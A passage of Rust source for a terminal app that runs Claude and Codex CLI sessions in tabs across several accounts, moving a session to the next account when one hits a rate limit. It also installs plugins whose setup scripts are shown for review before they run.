//! App state and behaviour: the home list of accounts, tabs of running CLIs, and failover
//! moving a tab's session to the next account when its claude stops on a rate limit.

use crate::config::{self, Entry, Kind, Paths};
use crate::failover::{self, Split};
use crate::form::{Confirm, Form, Outcome, Purpose};
use crate::pane::Pane;
use crate::plugins;
use crate::ui::{Button, Hits};
use crate::usage::{self, Usage};
use crate::wrr;
use crossterm::event::{KeyCode, KeyEvent, KeyModifiers, MouseButton, MouseEvent, MouseEventKind};
use ratatui::layout::{Position, Rect};
use std::path::PathBuf;
use std::time::{Duration, Instant};

pub const SWITCH_WAIT: Duration = Duration::from_secs(5);

#[derive(Clone, Copy, PartialEq)]
pub enum Focus {
    /// the home list of accounts
    Home,
    /// the current tab's CLI
    Pane,
}

pub enum Notice {
    /// A limit was hit: move to `to` at `at` (auto-switch on), else only when the user says `y`.
    Switch {
        from: String,
        to: String,
        /// `to` runs codex: the notice says the conversation goes to OpenAI
        codex: bool,
        at: Option<Instant>,
    },
    /// A limit was hit and no member is left.
    NoneLeft {
        from: String,
    },
    /// The CLI ended on its own.
    Ended {
        code: u32,
    },
    Error(String),
}

pub struct Tab {
    pub member: String,
    pub pane: Option<Pane>,
    pub notice: Option<Notice>,
    handoff: PathBuf,
    tried: Vec<String>,
    split: Split,
    session: Option<(String, PathBuf)>,
    /// the pane's exit was already handled (the pane stays for its last screen)
    done: bool,
}

pub enum Modal {
    Form(Form),
    Confirm(Confirm),
}

pub struct Row {
    pub entry: Entry,
    /// 1-based failover priority, for members.
    pub priority: Option<usize>,
    pub on: bool,
    pub limited: Option<Duration>,
    pub usage: Usage,
    /// round-robin weight, for members
    pub weight: u32,
    /// a plugin entry's status text and the detail lines under it
    pub status: String,
    pub details: Vec<String>,
}

/// One installed plugin as home shows it. Its `rows` run on a thread; the last good ones stay
/// on screen meanwhile.
pub struct PluginState {
    pub plugin: plugins::Plugin,
    /// None until the first `rows` answers; Some(None) when it failed
    pub rows: Option<Option<plugins::Rows>>,
    /// `plugin actions`: (action, label)
    pub actions: Vec<(String, String)>,
    loading: bool,
    /// a `plugin do` runs (one at a time)
    doing: bool,
    /// `rows` ran once this session: later runs get the short timeout
    ran: bool,
    /// first line of its `about` file
    pub about: String,
}

impl PluginState {
    /// The Plugins screen's status cell.
    pub fn status(&self) -> &'static str {
        match &self.rows {
            _ if !self.plugin.on => "off",
            None => "loading…",
            Some(None) => "failed",
            Some(Some(_)) => "ok",
        }
    }

    /// The section header: the plugin's own title, else its folder name.
    pub fn title(&self) -> String {
        match &self.rows {
            Some(Some(r)) if self.plugin.on && !r.title.is_empty() => r.title.clone(),
            _ => self.plugin.name.clone(),
        }
    }
}

/// The Plugins screen, open.
#[derive(Default)]
pub struct PluginsWin {
    /// an index into `plugins_items()`
    pub sel: usize,
    pub search: String,
    /// typing goes to `search`
    pub searching: bool,
    /// the add form (a source), shown inside the screen
    pub form: Option<Form>,
    /// a setup script to approve, shown over the list
    pub review: Option<Review>,
}

/// A setup script waiting for approval. `text` is what is shown and, on approve, exactly what
/// runs (`setup_copy`); `<dir>/setup` is never read again.
pub struct Review {
    pub target: SetupTarget,
    pub text: String,
    /// the first display row shown (long lines wrap, so every byte can be scrolled to)
    pub scroll: usize,
    /// approve does nothing until `APPROVE_DELAY` after this: a stray Enter can't approve
    pub opened: Instant,
    /// the last frame's (display rows, box rows, box columns), set by the draw
    pub view: std::cell::Cell<(usize, usize, usize)>,
}

/// How long after a review appears before Enter or a click can approve it.
pub const APPROVE_DELAY: Duration = Duration::from_millis(700);

pub enum SetupTarget {
    /// a new plugin in staging: kept only if setup exits 0
    Install(plugins::Staged),
    /// an installed plugin, by name: run again in its folder, never rolled back
    Rerun(String),
}

impl SetupTarget {
    pub fn name(&self) -> &str {
        match self {
            SetupTarget::Install(s) => &s.name,
            SetupTarget::Rerun(n) => n,
        }
    }
}

/// A setup script running in a tab, found by that tab's own handoff path (unique per tab).
struct SetupRun {
    tab: PathBuf,
    target: SetupTarget,
    /// the temp copy that runs; removed when it ends
    copy: PathBuf,
}

/// One line of the Plugins screen's list.
#[derive(Clone, Copy, Debug, PartialEq)]
pub enum Item {
    /// an index into `plugins`
    Installed(usize),
    /// an index into `available`
    Available(usize),
    AddButton,
}

/// What a plugin thread sends back.
enum PluginMsg {
    Rows(String, Option<plugins::Rows>),
    Actions(String, Vec<(String, String)>),
    /// a `do` ended: the line for the flash bar
    Done(String, String),
    /// an add or update ended: the line for the flash bar
    Changed(String),
    /// an install ended: the name it held (if known) and the line for the flash bar
    Installed(Option<String>, String),
    /// an install staged a plugin with a setup script: it waits for review
    Review(plugins::Staged),
}

/// An Auto launch waiting for the model's pick.
pub struct Deciding {
    rx: std::sync::mpsc::Receiver<Option<String>>,
    cands: Vec<(String, u32)>,
    default: String,
}

/// CLAUDE_CONFIG_DIR as ai started (`env`), unless it is a cla account's folder: inside a cla
/// session main still means ~/.claude.
fn base_config(env: Option<std::ffi::OsString>, paths: &Paths) -> Option<PathBuf> {
    config::outside(
        env.filter(|v| !v.is_empty()).map(PathBuf::from),
        &paths.cla_root,
    )
}

pub struct App {
    pub paths: Paths,
    pub rows: Vec<Row>,
    pub selected: usize,
    pub tabs: Vec<Tab>,
    pub current: usize,
    pub focus: Focus,
    pub failover: bool,
    /// weighted round-robin mode: Auto opens the next account by weight
    pub wrr: bool,
    /// `<order>.auto`: a limit switches by itself after SWITCH_WAIT instead of asking
    pub auto_switch: bool,
    /// entry `ai` opens on start, marked ★ on home
    pub default: String,
    pub deciding: Option<Deciding>,
    pub quit: bool,
    pub pane_size: (u16, u16),
    /// args `ai-launcher` was started with, for the first CLI opened
    first_args: Option<Vec<String>>,
    value_flags: Option<Vec<String>>,
    base_config: Option<PathBuf>,
    mod_dir: PathBuf,
    next_handoff: usize,
    pub modal: Option<Modal>,
    /// a short message under the home list, and when it goes away
    pub flash: Option<(String, Instant)>,
    /// a press started inside the pane: drags and release follow it outside
    pane_drag: bool,
    /// home row and time of the last click, for double-click to open
    last_click: Option<(usize, Instant)>,
    /// newer version found on npm
    pub update: Option<String>,
    update_rx: Option<std::sync::mpsc::Receiver<String>>,
    /// installed plugins by name; their rows come after the CLIs on home
    pub plugins: Vec<PluginState>,
    /// bundled plugins not installed
    pub available: Vec<plugins::Available>,
    pub plugins_win: Option<PluginsWin>,
    plugin_tx: std::sync::mpsc::Sender<PluginMsg>,
    plugin_rx: std::sync::mpsc::Receiver<PluginMsg>,
    /// plugin names staging, in review or running setup: a second install of one waits
    busy: Vec<String>,
    /// staged installs waiting for the Plugins screen to show their review
    pending: Vec<plugins::Staged>,
    setups: Vec<SetupRun>,
}

/// Windows path with `/` for Git Bash (`C:/…`); other systems keep the path as is.
fn to_bash_path(p: &str) -> String {
    if cfg!(windows) {
        p.replace('\\', "/")
    } else {
        p.to_string()
    }
}

impl App {
    pub fn new(args: Vec<String>) -> App {
        let paths = Paths::from_env();
        let rx = crate::update::spawn_check(paths.fo_state.parent().unwrap_or(&paths.fo_state));
        let mut app = App::with_paths(paths, args);
        app.update_rx = Some(rx);
        app.open_default();
        app
    }

    pub fn with_paths(paths: Paths, args: Vec<String>) -> App {
        let mod_dir = failover::install_mod(&paths);
        let (plugin_tx, plugin_rx) = std::sync::mpsc::channel();
        let mut app = App {
            failover: config::failover_on(&paths),
            wrr: false,
            auto_switch: false,
            default: String::new(),
            deciding: None,
            base_config: base_config(std::env::var_os("CLAUDE_CONFIG_DIR"), &paths),
            paths,
            rows: Vec::new(),
            selected: 0,
            tabs: Vec::new(),
            current: 0,
            focus: Focus::Home,
            quit: false,
            pane_size: (24, 80),
            first_args: Some(args),
            value_flags: None,
            mod_dir,
            next_handoff: 0,
            modal: None,
            flash: None,
            pane_drag: false,
            last_click: None,
            update: None,
            update_rx: None,
            plugins: Vec::new(),
            available: Vec::new(),
            plugins_win: None,
            plugin_tx,
            plugin_rx,
            busy: Vec::new(),
            pending: Vec::new(),
            setups: Vec::new(),
        };
        app.refresh();
        app.reload_plugins();
        app
    }

    fn entries(&self) -> Vec<Entry> {
        self.rows.iter().map(|r| r.entry.clone()).collect()
    }

    fn entry(&self, id: &str) -> Option<Entry> {
        self.rows
            .iter()
            .find(|r| r.entry.id == id)
            .map(|r| r.entry.clone())
    }

    /// Re-reads config, order, limits and usage. Members come first, in priority order.
    pub fn refresh(&mut self) {
        let selected = self.rows.get(self.selected).map(|r| r.entry.id.clone());
        let entries = config::entries(&self.paths, &config::providers(&self.paths));
        let order = config::order(&self.paths, &entries);
        let weights = config::weights(&self.paths);
        let mut rows: Vec<Row> = order
            .iter()
            .enumerate()
            .filter_map(|(i, (id, on))| {
                let e = entries.iter().find(|e| &e.id == id)?.clone();
                let mut r = self.row(e, Some(i + 1), *on);
                r.weight = config::weight_of(&weights, id);
                Some(r)
            })
            .collect();
        for e in entries.into_iter().filter(|e| !e.in_failover()) {
            rows.push(self.row(e, None, false));
        }
        let mut states = Vec::new();
        for p in plugins::list(&self.paths) {
            let old = self.plugins.iter().position(|s| s.plugin.name == p.name);
            let about = plugins::about(&p.dir);
            states.push(match old {
                Some(i) => PluginState {
                    plugin: p,
                    about,
                    ..self.plugins.swap_remove(i)
                },
                None => PluginState {
                    plugin: p,
                    about,
                    rows: None,
                    actions: Vec::new(),
                    loading: false,
                    doing: false,
                    ran: false,
                },
            });
        }
        self.plugins = states;
        self.available = plugins::available(&self.paths);
        rows.extend(self.plugins.iter().flat_map(plugin_rows));
        self.rows = rows;
        self.failover = config::failover_on(&self.paths);
        self.wrr = config::wrr_on(&self.paths);
        self.auto_switch = config::auto_switch_on(&self.paths);
        self.default = config::default_id(&self.paths);
        self.selected = selected
            .and_then(|id| self.rows.iter().position(|r| r.entry.id == id))
            .unwrap_or(0)
            .min(self.rows.len().saturating_sub(1));
    }

    /// Opens the default entry in a tab, if it still exists (a plugin's: installed and on;
    /// its rows may not have loaded yet).
    pub fn open_default(&mut self) {
        let id = self.default.clone();
        if self.entry(&id).is_some_and(|e| e.kind != Kind::Plugin)
            || plugins::resolve(&self.paths, &id).is_some()
        {
            self.open(&id);
        }
    }

    /// Runs `rows` (then `actions`) of every plugin that is on, each on its own thread, unless
    /// one already runs. Results arrive in `tick`.
    pub fn reload_plugins(&mut self) {
        for s in self
            .plugins
            .iter_mut()
            .filter(|s| s.plugin.on && !s.loading)
        {
            s.loading = true;
            let timeout = if s.ran {
                plugins::ROWS_TIMEOUT
            } else {
                plugins::FIRST_TIMEOUT
            };
            s.ran = true;
            let (tx, name, dir) = (
                self.plugin_tx.clone(),
                s.plugin.name.clone(),
                s.plugin.dir.clone(),
            );
            std::thread::spawn(move || {
                let rows = plugins::run(&dir, &["rows"], timeout)
                    .ok()
                    .map(|t| plugins::parse_rows(&t));
                let ok = rows.is_some();
                let _ = tx.send(PluginMsg::Rows(name.clone(), rows));
                if ok {
                    let actions = plugins::run(&dir, &["actions"], timeout)
                        .map(|t| plugins::parse_actions(&t))
                        .unwrap_or_default();
                    let _ = tx.send(PluginMsg::Actions(name, actions));
                }
            });
        }
    }

    fn plugin(&mut self, name: &str) -> Option<&mut PluginState> {
        self.plugins.iter_mut().find(|s| s.plugin.name == name)
    }

    fn row(&self, entry: Entry, priority: Option<usize>, on: bool) -> Row {
        let usage = match entry.kind {
            Kind::Claude => {
                let base = self.base_config.as_deref();
                usage::claude(
                    &config::claude_dir(&self.paths, &entry, base),
                    &config::claude_json(&self.paths, &entry, base),
                )
            }
            Kind::Codex => usage::codex(
                &config::account_dir(&self.paths, &entry).unwrap_or(self.paths.codex_home.clone()),
            ),
            Kind::Other | Kind::Plugin => Usage::default(),
        };
        let limited = priority.and_then(|_| config::limited_left(&self.paths, &entry.id));
        Row {
            entry,
            priority,
            on,
            limited,
            usage,
            weight: 1,
            status: String::new(),
            details: Vec::new(),
        }
    }

    fn order(&self) -> Vec<(String, bool)> {
        config::order(&self.paths, &self.entries())
    }

    pub fn label(&self, id: &str) -> String {
        if let Some((name, None)) = plugins::split_id(id) {
            return format!("plugin {name}");
        }
        match self.entry(id) {
            Some(e) if id.starts_with("claude/") || e.kind == Kind::Plugin => e.label,
            Some(e) => format!("{} ({id})", e.label),
            None => id.to_string(),
        }
    }

    // ── keys ──────────────────────────────────────────────

    pub fn on_key(&mut self, key: KeyEvent) {
        if self.modal.is_some() {
            return self.modal_key(key);
        }
        if self.plugins_win.is_some() {
            return self.plugins_win_key(key);
        }
        // alt-1..9 switch tabs from anywhere, even while typing in a CLI
        // (alt-← → are left to the CLI, where they jump words)
        if key.modifiers.contains(KeyModifiers::ALT) {
            match key.code {
                KeyCode::Char('0') => {
                    self.focus = Focus::Home;
                    return;
                }
                KeyCode::Char(c @ '1'..='9') => return self.show_tab(c as usize - '1' as usize),
                _ => {}
            }
        }
        // ctrl-\ moves between home and the last CLI tab
        // terminals send it as 0x1c, which crossterm reads as ctrl-4
        if matches!(key.code, KeyCode::Char('\\' | '4'))
            && key.modifiers.contains(KeyModifiers::CONTROL)
        {
            self.focus = match self.focus {
                Focus::Pane => Focus::Home,
                Focus::Home if !self.tabs.is_empty() => Focus::Pane,
                f => f,
            };
            return;
        }
        match self.focus {
            Focus::Home => self.home_key(key),
            Focus::Pane => self.pane_key(key),
        }
    }

    pub fn on_paste(&mut self, text: &str) {
        if let Some(m) = &mut self.modal {
            if let Modal::Form(f) = m {
                f.paste(text);
            }
            return;
        }
        if let Some(w) = &mut self.plugins_win {
            if let Some(f) = &mut w.form {
                f.paste(text);
            } else if w.searching {
                w.search.extend(text.chars().filter(|c| !c.is_control()));
            }
            return;
        }
        if self.focus == Focus::Pane
            && let Some(p) = self.tabs.get(self.current).and_then(|t| t.pane.as_ref())
        {
            p.paste(text);
        }
    }

    fn home_key(&mut self, key: KeyEvent) {
        let id = self.rows.get(self.selected).map(|r| r.entry.id.clone());
        if let Some((name, eid)) = id.as_deref().and_then(plugins::split_id)
            && self.plugin_key(name, eid.is_some(), key.code)
        {
            return self.refresh();
        }
        let shift = key.modifiers.contains(KeyModifiers::SHIFT);
        match key.code {
            KeyCode::Char('q') => self.quit = true,
            KeyCode::Char('c') if key.modifiers.contains(KeyModifiers::CONTROL) => self.quit = true,
            KeyCode::Up | KeyCode::Char('k') if shift || key.code == KeyCode::Char('K') => {
                self.move_member(-1)
            }
            KeyCode::Down | KeyCode::Char('j') if shift || key.code == KeyCode::Char('J') => {
                self.move_member(1)
            }
            KeyCode::Char('K') => self.move_member(-1),
            KeyCode::Char('J') => self.move_member(1),
            KeyCode::Up | KeyCode::Char('k') => self.selected = self.selected.saturating_sub(1),
            KeyCode::Down | KeyCode::Char('j') => {
                self.selected = (self.selected + 1).min(self.rows.len().saturating_sub(1))
            }
            KeyCode::Enter => {
                if let Some(id) = id {
                    self.open(&id);
                }
            }
            KeyCode::Char(' ') => {
                if let Some(id) = id {
                    self.toggle_member(&id);
                }
            }
            KeyCode::Char('*') => {
                if let Some(id) = id {
                    let new = if self.default == id { "" } else { id.as_str() };
                    config::set_default(&self.paths, new);
                }
            }
            KeyCode::Char('f') => config::set_failover(&self.paths, !self.failover),
            KeyCode::Char('w') => self.toggle_mode(),
            KeyCode::Char('s') => self.toggle_auto_switch(),
            KeyCode::Char('n') => self.open_auto(),
            KeyCode::Char('m') => {
                self.modal = Some(Modal::Form(Form::model(&config::model(&self.paths))))
            }
            KeyCode::Char('+' | '=') => self.add_weight(1),
            KeyCode::Char('-' | '_') => self.add_weight(-1),
            KeyCode::Char('r') => {
                if let Some(id) = id {
                    config::clear_limit(&self.paths, &id);
                }
            }
            KeyCode::Char('x') => self.close_tab(),
            KeyCode::Char('a') => self.modal = Some(Modal::Form(Form::add())),
            KeyCode::Char('p') => self.open_plugins(true),
            KeyCode::Char('P') => self.open_plugins(false),
            KeyCode::Char('e') => self.start_edit(),
            KeyCode::Char('d') => self.start_delete(),
            KeyCode::Tab => {
                if !self.tabs.is_empty() {
                    self.current = (self.current + 1) % self.tabs.len();
                }
            }
            KeyCode::Char(c @ '1'..='9') => {
                let n = c as usize - '1' as usize;
                if n < self.tabs.len() {
                    self.current = n;
                    self.focus = Focus::Pane;
                }
            }
            _ => {}
        }
        self.refresh();
    }

    fn pane_key(&mut self, key: KeyEvent) {
        let Some(tab) = self.tabs.get_mut(self.current) else {
            return;
        };
        match (&tab.notice, key.code) {
            (Some(Notice::Switch { .. }), KeyCode::Char('y' | 'Y'))
            | (Some(Notice::Switch { at: Some(_), .. }), KeyCode::Enter) => {
                self.switch_now(self.current)
            }
            (Some(Notice::Switch { .. } | Notice::NoneLeft { .. }), KeyCode::Char('o')) => {
                if let Some(Notice::Switch { from, .. }) = &tab.notice {
                    tab.notice = Some(Notice::NoneLeft { from: from.clone() });
                }
                self.focus = Focus::Home;
            }
            (
                Some(Notice::Switch { .. } | Notice::NoneLeft { .. }),
                KeyCode::Char('q') | KeyCode::Esc,
            ) => {
                tab.notice = Some(Notice::Ended { code: 1 });
            }
            (Some(Notice::NoneLeft { .. }), KeyCode::Enter) => self.retry(self.current),
            // a failed switch: try the switch again, the session is still there
            (Some(Notice::Error(_)), KeyCode::Enter) if tab.done && tab.session.is_some() => {
                self.retry(self.current)
            }
            // a setup tab has nothing to start again
            (Some(Notice::Ended { .. } | Notice::Error(_)), KeyCode::Enter)
                if tab.member.starts_with("setup:") =>
            {
                self.close_tab()
            }
            (Some(Notice::Ended { .. } | Notice::Error(_)), KeyCode::Enter) => {
                let member = tab.member.clone();
                self.tabs.remove(self.current);
                self.open(&member);
            }
            (Some(Notice::Ended { .. } | Notice::Error(_)), KeyCode::Char('x' | 'q')) => {
                self.close_tab()
            }
            (Some(_), _) => {}
            (None, _) => {
                if let Some(p) = &tab.pane {
                    p.key(key);
                }
            }
        }
    }

    /// Keys that mean something else on a plugin's row (`entry`: an entry, not its state line).
    /// Returns whether the key was handled here.
    fn plugin_key(&mut self, name: &str, entry: bool, code: KeyCode) -> bool {
        let Some(s) = self.plugin(name) else {
            return false;
        };
        let (on, dir) = (s.plugin.on, s.plugin.dir.clone());
        match code {
            KeyCode::Enter if !entry => self.say(if on {
                format!("{name} has nothing to open right now.")
            } else {
                format!("{name} is off: press o to turn it on.")
            }),
            // a state line can't be the default: nothing would open
            KeyCode::Char('*') if !entry => {}
            KeyCode::Char('a') => self.plugin_actions(name),
            KeyCode::Char('o') => self.toggle_plugin(name),
            KeyCode::Char('u') if !plugins::from_git(&dir) => self.say(format!(
                "{name} was not installed from git: nothing to update."
            )),
            KeyCode::Char('u') => {
                let (paths, name) = (self.paths.clone(), name.to_string());
                self.say(format!("Updating {name}…"));
                self.in_background(move || match plugins::update(&paths, &name) {
                    Ok(line) => format!("Updated {name}: {line}"),
                    Err(e) => format!("Could not update {name}: {e}"),
                });
            }
            KeyCode::Char('d') if self.busy.iter().any(|n| n == name) => {
                self.say(format!("{name} is busy: remove it after its setup ends."))
            }
            KeyCode::Char('d') => {
                self.modal = Some(Modal::Confirm(Confirm {
                    id: format!("plugin:{name}"),
                    what: format!(
                        "Its folder {} is deleted for good (a linked folder loses only the link). Its open tabs close.",
                        dir.display()
                    ),
                }))
            }
            KeyCode::Char('e') => self.say(format!(
                "A plugin is edited in its folder: {}",
                dir.display()
            )),
            _ => return false,
        }
        true
    }

    /// Opens the Plugins screen, with the add form open or not.
    fn open_plugins(&mut self, form: bool) {
        self.plugins_win = Some(PluginsWin {
            form: form.then(Form::add_plugin),
            ..PluginsWin::default()
        });
        self.next_review();
    }

    /// The Plugins screen's list: installed, then available, then the add button; filtered by
    /// the search text (case-insensitive, in the name or `about`).
    pub fn plugins_items(&self) -> Vec<Item> {
        let q = self
            .plugins_win
            .as_ref()
            .map(|w| w.search.to_lowercase())
            .unwrap_or_default();
        let hit = |name: &str, about: &str| {
            name.to_lowercase().contains(&q) || about.to_lowercase().contains(&q)
        };
        let installed = self.plugins.iter().enumerate();
        let mut items: Vec<Item> = installed
            .filter(|(_, s)| hit(&s.plugin.name, &s.about))
            .map(|(i, _)| Item::Installed(i))
            .collect();
        let available = self.available.iter().enumerate();
        items.extend(
            available
                .filter(|(_, p)| hit(&p.name, &p.about))
                .map(|(i, _)| Item::Available(i)),
        );
        items.push(Item::AddButton);
        items
    }

    /// The Plugins screen's keys. Esc closes the innermost thing: the form, the search text,
    /// search itself, then the screen.
    fn plugins_win_key(&mut self, key: KeyEvent) {
        let Some(w) = self.plugins_win.as_mut() else {
            return;
        };
        if let Some(r) = w.review.as_mut() {
            let (rows, h, _) = r.view.get();
            let last = rows.saturating_sub(h);
            match key.code {
                KeyCode::Up => r.scroll = r.scroll.saturating_sub(1),
                KeyCode::Down => r.scroll = (r.scroll + 1).min(last),
                KeyCode::PageUp => r.scroll = r.scroll.saturating_sub(10),
                KeyCode::PageDown => r.scroll = (r.scroll + 10).min(last),
                KeyCode::Enter => self.approve(),
                KeyCode::Esc => self.cancel_review(),
                _ => {}
            }
            return;
        }
        if let Some(mut f) = w.form.take() {
            match f.key(key) {
                Outcome::Open => w.form = Some(f),
                Outcome::Cancel => {}
                Outcome::Save => {
                    if let Err(e) = self.save_form(&f) {
                        f.error = Some(e);
                        if let Some(w) = self.plugins_win.as_mut() {
                            w.form = Some(f);
                        }
                    }
                }
            }
            return;
        }
        if w.searching {
            match key.code {
                KeyCode::Esc if !w.search.is_empty() => w.search.clear(),
                KeyCode::Esc | KeyCode::Enter | KeyCode::Up | KeyCode::Down => w.searching = false,
                KeyCode::Backspace => {
                    w.search.pop();
                }
                KeyCode::Char(c) if !key.modifiers.contains(KeyModifiers::CONTROL) => {
                    w.search.push(c);
                    w.sel = 0;
                }
                _ => {}
            }
            return;
        }
        let items = self.plugins_items();
        let Some(w) = self.plugins_win.as_mut() else {
            return;
        };
        let sel = w.sel.min(items.len() - 1);
        w.sel = sel;
        let name = match items[sel] {
            Item::Installed(i) => Some(self.plugins[i].plugin.name.clone()),
            _ => None,
        };
        match key.code {
            KeyCode::Esc if !w.search.is_empty() => w.search.clear(),
            KeyCode::Esc | KeyCode::Char('q') => self.plugins_win = None,
            KeyCode::Up | KeyCode::Char('k') => w.sel = sel.saturating_sub(1),
            KeyCode::Down | KeyCode::Char('j') => w.sel = (sel + 1).min(items.len() - 1),
            KeyCode::Char('/') => w.searching = true,
            KeyCode::Enter | KeyCode::Char('a') if name.is_some() => {
                self.plugin_key(name.as_deref().unwrap_or(""), false, KeyCode::Char('a'));
            }
            KeyCode::Enter | KeyCode::Char('+') => match items[sel] {
                Item::Available(i) => self.install(self.available[i].name.clone()),
                _ => w.form = Some(Form::add_plugin()),
            },
            KeyCode::Char('s') => {
                if let Some(name) = name {
                    self.open_review(SetupTarget::Rerun(name));
                }
            }
            KeyCode::Char(c @ (' ' | 'o' | 'u' | '-')) => {
                if let Some(name) = name {
                    let c = match c {
                        ' ' => 'o',
                        '-' => 'd',
                        c => c,
                    };
                    self.plugin_key(&name, false, KeyCode::Char(c));
                }
            }
            _ => {}
        }
        self.refresh();
    }

    /// Stages `source` and installs it on a thread (git may take a while); the result goes to
    /// the flash bar, then plugins reload. A setup script goes to the review screen first.
    /// A name already staging, in review or running setup is left alone: staging again would
    /// remove its live staging folder.
    fn install(&mut self, source: String) {
        let name = plugins::source_name(&source).ok().map(|(n, _)| n);
        if let Some(n) = &name {
            if self.busy.contains(n) {
                return self.say(format!("{n} is already being installed."));
            }
            self.busy.push(n.clone());
        }
        let paths = self.paths.clone();
        let shown = plugins::hide_userinfo(&source);
        self.say(format!("Installing {shown}…"));
        let tx = self.plugin_tx.clone();
        std::thread::spawn(move || {
            let failed = |e: String| format!("Could not install {shown}: {e}");
            let line = match plugins::stage(&paths, &source) {
                Ok(s) if s.setup.is_some() => {
                    let _ = tx.send(PluginMsg::Review(s));
                    return;
                }
                Ok(s) => plugins::commit(&paths, &s).unwrap_or_else(failed),
                Err(e) => failed(e),
            };
            let _ = tx.send(PluginMsg::Installed(name, line));
        });
    }

    /// Shows a setup script for approval: a staged install's, or an installed plugin's own
    /// (read now; what is shown is what runs).
    fn open_review(&mut self, target: SetupTarget) {
        let name = target.name().to_string();
        let text = match &target {
            SetupTarget::Install(s) => s.setup.clone(),
            SetupTarget::Rerun(_) if self.busy.contains(&name) => {
                return self.say(format!("{name} is busy."));
            }
            SetupTarget::Rerun(_) => {
                let dir = self.plugin(&name).map(|s| s.plugin.dir.clone());
                match dir.map(|d| plugins::setup_text(&d)) {
                    Some(Ok(t)) => t,
                    Some(Err(e)) => return self.say(format!("{name}: {e}")),
                    None => return,
                }
            }
        };
        let Some(text) = text else {
            return self.say("no setup script");
        };
        // only inside the Plugins screen, one at a time: never over a CLI that is taking keys
        let Some(w) = self.plugins_win.as_mut().filter(|w| w.review.is_none()) else {
            let open = self.plugins_win.is_some();
            match target {
                SetupTarget::Install(s) => {
                    self.pending.push(s);
                    self.say(if open {
                        format!("{name} ready to review after this one.")
                    } else {
                        format!("{name} ready to review: open Plugins")
                    });
                }
                SetupTarget::Rerun(_) => self.say(format!("{name}: finish the open review first.")),
            }
            return;
        };
        w.review = Some(Review {
            target,
            text,
            scroll: 0,
            opened: Instant::now(),
            view: std::cell::Cell::new((0, 0, 0)),
        });
        if !self.busy.contains(&name) {
            self.busy.push(name);
        }
    }

    /// Opens the next staged install waiting for review, if the Plugins screen is free.
    fn next_review(&mut self) {
        if self
            .plugins_win
            .as_ref()
            .is_some_and(|w| w.review.is_none())
            && !self.pending.is_empty()
        {
            let s = self.pending.remove(0);
            self.open_review(SetupTarget::Install(s));
        }
    }

    fn cancel_review(&mut self) {
        let Some(r) = self.plugins_win.as_mut().and_then(|w| w.review.take()) else {
            return;
        };
        self.busy.retain(|n| n != r.target.name());
        match &r.target {
            SetupTarget::Install(s) => {
                plugins::abort(s);
                self.say("cancelled: plugin not installed");
            }
            SetupTarget::Rerun(_) => self.say("cancelled: setup not run"),
        }
        self.next_review();
    }

    /// Runs the reviewed text (a temp copy of it) as `bash <copy>` in a new `setup:<name>` tab,
    /// in the staging folder (install) or the plugin's folder (rerun, after `config.bak`).
    fn approve(&mut self) {
        let Some(r) = self.plugins_win.as_ref().and_then(|w| w.review.as_ref()) else {
            return;
        };
        if r.opened.elapsed() < APPROVE_DELAY {
            return;
        }
        let (_, h, w) = r.view.get();
        // nothing of the script shown (or not drawn yet): nothing to approve
        if h == 0 || w == 0 {
            return self.say("window too small to review");
        }
        let Some(r) = self.plugins_win.as_mut().and_then(|w| w.review.take()) else {
            return;
        };
        let name = r.target.name().to_string();
        let dir = match &r.target {
            SetupTarget::Install(s) => Ok(s.dir.clone()),
            SetupTarget::Rerun(n) => match self.plugin(n).map(|s| s.plugin.dir.clone()) {
                Some(d) => plugins::backup_config(&d)
                    .map(|()| d)
                    .map_err(|e| format!("could not back up config: {e}")),
                None => Err("no longer installed".into()),
            },
        };
        let started = dir.and_then(|d| plugins::setup_copy(&r.text).map(|c| (d, c)));
        let (dir, copy) = match started {
            Ok(v) => v,
            Err(e) => {
                if let SetupTarget::Install(s) = &r.target {
                    plugins::abort(s);
                }
                self.busy.retain(|n| *n != name);
                return self.say(format!("setup of {name} not run: {e}"));
            }
        };
        self.plugins_win = None;
        self.next_handoff += 1;
        let tab = self.paths.fo_state.join(format!(
            "handoff.{}.{}.json",
            std::process::id(),
            self.next_handoff
        ));
        self.tabs.push(Tab {
            member: format!("setup:{name}"),
            pane: None,
            notice: None,
            handoff: tab.clone(),
            tried: Vec::new(),
            split: Split::default(),
            session: None,
            done: false,
        });
        self.current = self.tabs.len() - 1;
        self.focus = Focus::Pane;
        let d = dir.to_string_lossy();
        // Git Bash takes C:/x for sure; backslashes are left to its path guessing
        let bash_path = |p: &str| shell_quote(&to_bash_path(p));
        let command = format!(
            "cd {} && bash {}",
            bash_path(&d),
            bash_path(&copy.to_string_lossy())
        );
        let env = vec![("AI_PLUGIN_DIR".to_string(), Some(to_bash_path(&d)))];
        let (rows, cols) = self.pane_size;
        match Pane::spawn(&command, &[], &env, rows, cols) {
            Ok(p) => self.tabs[self.current].pane = Some(p),
            // no pane: `tick` ends it as a failure
            Err(e) => {
                self.tabs[self.current].notice =
                    Some(Notice::Error(format!("could not start setup: {e}")))
            }
        }
        self.setups.push(SetupRun {
            tab,
            target: r.target,
            copy,
        });
    }

    /// Ends setups whose tab exited (or closed, or never started): an install is kept only on
    /// exit 0; a rerun keeps the plugin either way. The temp copy goes.
    fn finish_setups(&mut self) {
        let mut i = 0;
        while i < self.setups.len() {
            let tab = self
                .tabs
                .iter_mut()
                .find(|t| t.handoff == self.setups[i].tab);
            let code = match tab.map(|t| t.pane.as_mut().map(Pane::exited)) {
                // still running
                Some(Some(None)) => {
                    i += 1;
                    continue;
                }
                Some(Some(Some(c))) => Some(c),
                // closed, or it never started
                _ => None,
            };
            let run = self.setups.remove(i);
            let _ = std::fs::remove_file(&run.copy);
            let name = run.target.name().to_string();
            self.busy.retain(|n| *n != name);
            let why = code.map_or("tab closed".to_string(), |c| format!("exit {c}"));
            match run.target {
                SetupTarget::Install(s) if code == Some(0) => {
                    let paths = self.paths.clone();
                    self.say(format!("Installing {name}…"));
                    self.busy.push(name.clone());
                    // commit warms `rows` (up to 10 s): off the UI thread
                    let tx = self.plugin_tx.clone();
                    std::thread::spawn(move || {
                        let line = match plugins::commit(&paths, &s) {
                            Ok(_) => format!("installed plugin {name}"),
                            Err(e) => format!("Could not install {name}: {e}"),
                        };
                        let _ = tx.send(PluginMsg::Installed(Some(name), line));
                    });
                }
                SetupTarget::Install(s) => {
                    plugins::abort(&s);
                    self.say(format!("setup failed ({why}): plugin not installed"));
                }
                SetupTarget::Rerun(_) if code == Some(0) => self.say("setup done"),
                SetupTarget::Rerun(_) => self.say(format!("setup failed ({why})")),
            }
        }
    }

